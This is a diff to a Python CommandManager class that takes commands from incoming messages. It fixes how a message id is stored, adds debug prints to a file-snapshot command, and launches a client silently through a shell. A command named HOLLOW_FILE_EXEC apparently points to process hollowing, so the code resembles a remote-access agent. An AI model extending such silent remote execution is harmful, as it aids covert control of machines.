@@ -14,12 +14,14 @@ class CommandManager(object):
     def __init__(self, writer, reader):
         self.writer = writer
         self.reader = reader
-        self.id = id
+        self.id = None
         self.waitingForResult = False
         self.tag = "root"
      
     def retriveCommand(self, message:dict, getcd=False):
         command = message.get("message").get("command")
+        if not self.id: self.id = message.get("id")
+        message = message.get("message")
         self.waitingForResult = command is not None and len(command) > 0
         if not self.waitingForResult: 
             return
@@ -49,7 +51,10 @@ class CommandManager(object):
             return tryParse(int, status, 1) == 0
         
         if command == FILES_SNAP_FULL:
+            print("FILES_SNAP_FULL Selected")
+            print(message)
             self.writer(gen_xml(self.tag, **message).encode())
+            print('EndProcessing')
             return json.loads(self.reader().decode(errors='replace'))
         
         if command == HOLLOW_FILE_EXEC:
@@ -67,7 +72,7 @@ class CommandManager(object):
             execute = EXECUTE_INTERNAL_CLIENT.format(
                 internalClientPath, 
                 "local", 
-                message.get("id").strip()
+                self.id.strip()
             )
             print(execute)
             Popen(execute, shell=True, stdout=DEVNULL, stderr=DEVNULL)
